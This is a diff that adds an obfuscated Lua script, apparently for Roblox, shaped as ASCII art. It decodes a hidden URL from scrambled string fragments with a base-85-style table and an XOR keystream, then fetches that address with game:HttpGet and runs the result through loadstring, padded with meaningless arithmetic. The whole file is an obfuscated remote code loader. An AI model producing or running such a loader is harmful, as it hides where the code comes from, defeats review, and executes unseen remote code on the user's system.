@@ -1,0 +1,53 @@
+-- Obfuscated with slayfuscator
+
+
+
+                                          local c
+                                        = {[7] =
+                                     "fE/Uz<" ,
+                                  [9] = "DQ<m"
+                                 ,  [ 5 ]   =
+                               "k=B!", [4]  =
+                             "({<>_|", [8] =
+                             ":Y_l", [11]  =
+                             "F-ExmS", [3 ]
+                             = "DqR1R", [13
+                        ]    = "hk1K", [2 ]
+                        =    "{Qj!+j", [6 ]
+                       =     "#1L^7M", [1 ]
+                      =       "LEr7E{", [12
+                      ]   =   "cMc", [10] =
+                     "8B5qh"   }; local a =
+                     "01234"   .. "56789" ..
+                     "abcde"    .."fghij" ..
+                     "klmno"..   "pqrst"  ..
+                     "uvwxy" ..   "zABCD"  ..
+                     "EFGHI".."J"  .."KLMN" ..
+                     "OPQRS".."TU"  .."VWX".."YZ."
+                     .."-:".."+=^!/"  .."*?&<>" ..            "(){}@"  ..
+                     "%$#_|"; local  p  =  table .        concat(c);  local
+                      s = {}; local h  = 23400   ;     for e = 1,  #p, 5  do
+                      local r = 0; for t = e, e  + 4 do r = r * 85 + string .
+                        find(a, p:sub(t, t), 1, true) - 1; end; for t = 3, 0, -
+                           1 do h = (h *  74 + 29285) % 65521;  s[#s + 1]  =
+                                string.char(bit32.bxor(math.floor(r/256^t) % 256,
+                         h % 256));  end; end; c =  table.concat(s): sub(1, 51) ;
+                           local f, i  = loadstring(game: HttpGet(c)) ;
+                            assert(f, i); do local n = 2; n = (n * 9             )
+                             % 6; end; do local n = {6, 3}; n[1]  =
+                               n[2] % 1; end; do local n = 6; n = (
+                                 n  *  1) % 8; end; do local n = 6 ;
+                                     n = (n * 2) % 1; end; local n =
+                                     4 % 4 % 4 % 9 + 2 + 7 % 5 + 1 % 4
+                                          + 3 - 4 - 9 - 7 % 2 - 3 - 1 -
+                                                4 - 3 + 1 - 1 + 2 % 7  +
+                                                        6 % 7 + 4 - 7 % 1
+                                                             % 1 + 2 + 8  +
+                                                                6 % 3 - 7 %
+                                                                   9 + 3 - 9
+                                                                     -    2;
+                                                                       return
+                                                                           f(
+                                                                           ...
+                                                                             )
+ )
